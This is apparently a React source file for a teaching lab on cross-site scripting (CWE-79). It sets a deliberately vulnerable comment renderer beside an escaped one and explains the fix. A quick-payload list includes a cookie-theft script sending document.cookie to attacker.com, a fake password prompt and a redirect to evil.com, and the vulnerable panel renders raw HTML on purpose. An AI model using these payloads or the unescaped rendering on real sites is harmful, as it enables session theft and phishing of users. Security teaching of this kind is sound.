'use client';
import { useState } from 'react';
import LabShell from '@/components/LabShell';
import styles from './page.module.css';

const PAYLOADS = [
  { label: 'Basic alert',      value: '<script>alert("XSS! Cookie: " + document.cookie)</script>' },
  { label: 'Img onerror',      value: '<img src=x onerror="alert(\'XSS via img tag!\')">' },
  { label: 'SVG onload',       value: '<svg onload=alert(document.domain)>' },
  { label: 'Cookie theft',     value: '<script>fetch("https://attacker.com?c="+document.cookie)</script>' },
  { label: 'Session hijack',   value: '<script>document.body.innerHTML="<h1>Phished! Enter password:</h1><input>"</script>' },
  { label: 'iFrame injection', value: '<iframe src="javascript:alert(`XSS`)"></iframe>' },
  { label: 'Redirect',         value: '<script>window.location="https://evil.com"</script>' },
];

interface Comment { id: number; author: string; vulnHtml: string; safeHtml: string; sanitized: string; }

export default function XSSLab() {
  const [input, setInput]       = useState('');
  const [author, setAuthor]     = useState('hacker');
  // FIX: comments stored in React state only — no server persistence needed
  const [comments, setComments] = useState<Comment[]>([]);
  const [loading, setLoading]   = useState(false);
  const [attackCount, setAttackCount] = useState(0);
  const [blockedCount, setBlockedCount] = useState(0);

  const run = async (payload?: string) => {
    const text = payload ?? input;
    if (!text.trim()) return;
    setLoading(true);

    // FIX: fire both routes and await both — one stateless POST per click
    const [vulnRes, safeRes] = await Promise.all([
      fetch('/api/xss-vulnerable', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ comment: text, author }),
      }),
      fetch('/api/xss-secure', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ comment: text, author }),
      }),
    ]);

    const vuln = await vulnRes.json();
    const safe = await safeRes.json();

    const newComment: Comment = {
      id: Date.now(),
      author,
      vulnHtml: vuln.html,
      safeHtml: safe.html,
      sanitized: safe.sanitized,
    };

    // Prepend newest first, cap at 10
    setComments(prev => [newComment, ...prev].slice(0, 10));
    setAttackCount(c => c + 1);
    if (safe.sanitized !== text) setBlockedCount(c => c + 1);

    setLoading(false);
  };

  // FIX: clicking a quick-payload button immediately fires it
  const selectPayload = (value: string) => {
    setInput(value);
    run(value);
  };

  return (
    <LabShell
      title="Cross-Site Scripting"
      short="XSS"
      cwe="CWE-79"
      severity="HIGH"
      description="XSS allows attackers to inject client-side scripts into web pages. When other users view the page, the malicious script executes in their browser context — giving the attacker access to cookies, session tokens, and the full DOM."
      references={[
        { label: 'OWASP XSS',   href: 'https://owasp.org/www-community/attacks/xss/' },
        { label: 'PortSwigger', href: 'https://portswigger.net/web-security/cross-site-scripting' },
      ]}
    >
      {/* Stats bar */}
      <div className={styles.statsBar}>
        <div className={styles.stat}>
          <span className={styles.statNum} style={{ color: 'var(--red)' }}>{attackCount}</span>
          <span className={styles.statLabel}>Attacks fired</span>
        </div>
        <div className={styles.statDiv} />
        <div className={styles.stat}>
          <span className={styles.statNum} style={{ color: 'var(--green)' }}>{blockedCount}</span>
          <span className={styles.statLabel}>Blocked by fix</span>
        </div>
        {comments[0]?.sanitized && (
          <>
            <div className={styles.statDiv} />
            <div className={styles.stat} style={{ flex: 1 }}>
              <span className={styles.statLabel}>Last sanitized output</span>
              <code className={styles.sanitizedCode}>
                {comments[0].sanitized || '(empty — all tags stripped)'}
              </code>
            </div>
          </>
        )}
      </div>

      {/* Payload picker — FIX: each button calls selectPayload which fires immediately */}
      <div className={styles.payloadBar}>
        <span className={styles.payloadLabel}>Quick payloads:</span>
        <div className={styles.payloadBtns}>
          {PAYLOADS.map(p => (
            <button
              key={p.label}
              className={`btn btn-ghost ${styles.payloadBtn}`}
              onClick={() => selectPayload(p.value)}
            >
              {p.label}
            </button>
          ))}
        </div>
      </div>

      {/* Input area */}
      <div className={styles.inputRow}>
        <div className={styles.inputGroup}>
          <label className={styles.inputLabel}>Author</label>
          <input
            type="text"
            value={author}
            onChange={e => setAuthor(e.target.value)}
            style={{ width: 140 }}
          />
        </div>
        <div className={styles.inputGroup} style={{ flex: 1 }}>
          <label className={styles.inputLabel}>Comment / payload</label>
          <input
            type="text"
            value={input}
            onChange={e => setInput(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && run()}
            placeholder="Type a comment or choose a payload above…"
          />
        </div>
        <button className="btn btn-red" onClick={() => run()} disabled={loading || !input.trim()}>
          {loading ? 'Posting…' : 'Post comment →'}
        </button>
      </div>

      {/* Side-by-side panels */}
      <div className={styles.panels}>
        {/* Vulnerable */}
        <div className={`${styles.panel} ${styles.panelVuln} scanline`}>
          <div className={styles.panelHeader}>
            <div className={styles.panelHeaderLeft}>
              <span className={styles.panelDot} style={{ background: 'var(--red)', boxShadow: '0 0 6px var(--red)' }} />
              <span className={styles.panelTitle}>Vulnerable</span>
              <span className="badge badge-red">innerHTML / no escaping</span>
            </div>
          </div>

          <div className={styles.panelCode}>
            <div className={styles.codeLabel}>app/api/xss-vulnerable/route.ts</div>
            <pre className={styles.code}>{`// ❌ VULNERABLE
// Returns raw HTML — browser executes it
html: \`<div>\${comment}</div>\`
// Scripts and event handlers EXECUTE`}</pre>
          </div>

          <div className={styles.outputArea}>
            <div className={styles.outputLabel}>Live output — scripts execute here:</div>
            {comments.length === 0 ? (
              <p className={styles.emptyState}>No comments yet. Post one above.</p>
            ) : (
              comments.map(c => (
                <div
                  key={c.id}
                  className={styles.commentItem}
                  dangerouslySetInnerHTML={{ __html: c.vulnHtml }}
                />
              ))
            )}
          </div>
        </div>

        {/* Secure */}
        <div className={`${styles.panel} ${styles.panelSafe}`}>
          <div className={styles.panelHeader}>
            <div className={styles.panelHeaderLeft}>
              <span className={styles.panelDot} style={{ background: 'var(--green)', boxShadow: '0 0 6px var(--green)' }} />
              <span className={styles.panelTitle}>Secure</span>
              <span className="badge badge-green">HTML entity escaping</span>
            </div>
          </div>

          <div className={styles.panelCode}>
            <div className={styles.codeLabel}>app/api/xss-secure/route.ts</div>
            <pre className={styles.code}>{`// ✅ SECURE
function escapeHtml(str: string) {
  return str
    .replace(/&/g,  '&amp;')
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#039;');
}
// Tags become plain text, never executed`}</pre>
          </div>

          <div className={styles.outputArea}>
            <div className={styles.outputLabel}>Safe output — tags rendered as text:</div>
            {comments.length === 0 ? (
              <p className={styles.emptyState}>No comments yet.</p>
            ) : (
              comments.map(c => (
                <div
                  key={c.id}
                  className={styles.commentItemSafe}
                  dangerouslySetInnerHTML={{ __html: c.safeHtml }}
                />
              ))
            )}
          </div>
        </div>
      </div>

      {/* Explanation */}
      <div className={styles.explanation}>
        <h3 className={styles.explainTitle}>How XSS works</h3>
        <div className={styles.explainGrid}>
          <div className={styles.explainStep}>
            <div className={styles.stepNum}>1</div>
            <div>
              <div className={styles.stepTitle}>Attacker submits payload</div>
              <div className={styles.stepDesc}>A script tag or event handler is submitted as user input to a comment, search box, or profile field.</div>
            </div>
          </div>
          <div className={styles.explainStep}>
            <div className={styles.stepNum}>2</div>
            <div>
              <div className={styles.stepTitle}>Server stores raw input</div>
              <div className={styles.stepDesc}>The vulnerable server saves the payload verbatim to the database without escaping or sanitizing.</div>
            </div>
          </div>
          <div className={styles.explainStep}>
            <div className={styles.stepNum}>3</div>
            <div>
              <div className={styles.stepTitle}>Victim loads the page</div>
              <div className={styles.stepDesc}>When another user visits, the malicious script is embedded in the HTML and executed by their browser.</div>
            </div>
          </div>
          <div className={styles.explainStep}>
            <div className={styles.stepNum} style={{ background: 'var(--green-dim)', color: 'var(--green)', borderColor: 'var(--green-mid)' }}>✓</div>
            <div>
              <div className={styles.stepTitle}>Fix: escape all output</div>
              <div className={styles.stepDesc}>Replace <code>&lt;</code> with <code>&amp;lt;</code>, <code>&gt;</code> with <code>&amp;gt;</code> — tags become displayable text, not executable HTML.</div>
            </div>
          </div>
        </div>
      </div>
    </LabShell>
  );
}
